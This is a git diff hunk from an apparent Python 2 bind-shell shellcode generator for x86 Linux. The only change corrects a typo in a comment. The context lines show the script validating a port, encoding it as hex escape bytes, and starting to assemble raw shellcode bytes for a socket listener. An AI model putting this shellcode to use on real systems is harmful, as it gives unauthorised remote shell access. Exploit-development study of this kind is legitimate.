@@ -14,7 +14,7 @@ if (port < 1024 or port > 65535):
 	print "[!] {} not a valid port, must be between 0-65535!".format(port) #tell people off for being silly
 	exit()
 port = hex(port)[2:] # slice out the preceeding "0x" before the hex output
-port = '\\x'+str(port[0:2]) + '\\x'+str(port[2:4]) # further break up hex output and place our "\\x" in fornt of each hex val		
+port = '\\x'+str(port[0:2]) + '\\x'+str(port[2:4]) # further break up hex output and place our "\\x" in front of each hex val		
 shellcode = ""
 shellcode += "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xb0"
 shellcode += "\\x66\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x31\\xdb\\x53\\x66\\x68"
